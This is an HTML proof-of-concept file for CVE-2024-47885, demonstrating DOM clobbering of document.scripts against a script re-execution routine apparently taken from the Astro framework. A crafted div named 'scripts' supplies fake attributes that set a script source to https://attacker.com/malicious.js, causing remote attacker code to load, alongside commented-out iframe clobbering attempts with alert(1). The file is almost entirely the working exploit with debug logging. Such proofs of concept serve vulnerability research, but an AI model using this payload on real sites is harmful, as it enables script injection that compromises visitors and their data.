<!DOCTYPE html>
<html>
<head>
    <title>CVE-2024-47885</title>
</head>
<body>
    /////clobbering payload/////
<!--     <iframe name="scripts">alert(1)</iframe>
    <iframe name="scripts">alert(1)</iframe> -->
    ///////////////////////////
    <!-- Step 1: Clobber document.scripts -->
    <div id="scripts">
        <!-- Step 2: Add fake attributes to manipulate script.attributes -->
        <div attributes='{"0": {"name": "src", "value": "https://attacker.com/malicious.js"}}'>
        </div>
    </div>



    <script>
        console.log("hello");
    </script>
    <script>
        function runScripts() {
            var wait = Promise.resolve();
            var _loop_1 = function (script) {
                if (script.dataset.astroExec === '')
                    return "continue";
                var type = script.getAttribute('type');
                if (type && type !== 'module' && type !== 'text/javascript')
                    return "continue";
                var newScript = document.createElement('script');
                newScript.innerHTML = script.innerHTML;
                console.log("script.innerHTML"+script.innerHTML);
                var _loop_2 = function (attr) {
                    if (attr.name === 'src') {
                        var p_1 = new Promise(function (r) {
                            newScript.onload = newScript.onerror = r;
                        });
                        wait = wait.then(function () { return p_1; });
                    }
                    console.log("attr.name"+attr.name);
                    console.log("attr.value"+attr.value);
                    newScript.setAttribute(attr.name, attr.value);
                };
                console.log("script.attributes"+script.attributes);
                for (var _b = 0, _c = script.attributes; _b < _c.length; _b++) {
                    var attr = _c[_b];
                    console.log("attr"+attr);
                    _loop_2(attr);
                }
                newScript.dataset.astroExec = '';
                script.replaceWith(newScript);
            };
            for (var _i = 0, _a = Array.from(document.scripts); _i < _a.length; _i++) {
                var script = _a[_i];
                _loop_1(script);
            }
            return wait;
        }    

    </script>
</body>
</html>
